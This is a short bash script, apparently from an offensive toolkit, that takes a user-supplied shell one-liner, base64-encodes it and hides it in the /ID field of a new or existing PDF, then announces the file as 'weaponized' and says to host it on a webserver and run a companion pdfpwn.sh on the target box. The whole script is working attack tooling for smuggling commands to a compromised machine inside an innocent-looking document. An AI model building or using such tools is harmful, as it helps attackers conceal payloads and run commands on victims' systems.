#!/bin/bash

if [[ ! -f /usr/bin/convert ]];
then
	echo "[-] Dependency Missing: imagemagick"
	DEP=0
elif [[ ! -f /usr/bin/base64 ]];
then
	echo "[-] Dependency Missing: base64"
	DEP=0
elif [[ ! -f /usr/bin/wget ]];
then
	echo "[-] Dependency Missing: wget"
	DEP=0
fi

if [[ $DEP == 0 ]];
then
	exit
fi

echo "[+] Input File Name (e.g. mal.pdf)"
read fname

echo "[+] Input Shell Commands (i.e. one liner)"
read shell

payload=$(echo $shell | base64)

if [[ -f $fname ]];
then
	sed -i "s/^\/ID \[<.*> <.*>\]/\/ID \[<$payload> <$payload>\]/g" $fname &&
	echo "[+] $fname PDF weaponized"
	echo "[+] Host it on a webserver and run pdfpwn.sh on target box"
	exit
fi

rm $fname 2> /dev/null
convert xc:none -page Letter $fname && 
sed -i "s/^\/ID \[<.*> <.*>\]/\/ID \[<$payload> <$payload>\]/g" $fname &&
echo "[+] $fname PDF weaponized"
echo "[+] Host it on a webserver and run pdfpwn.sh on target box"
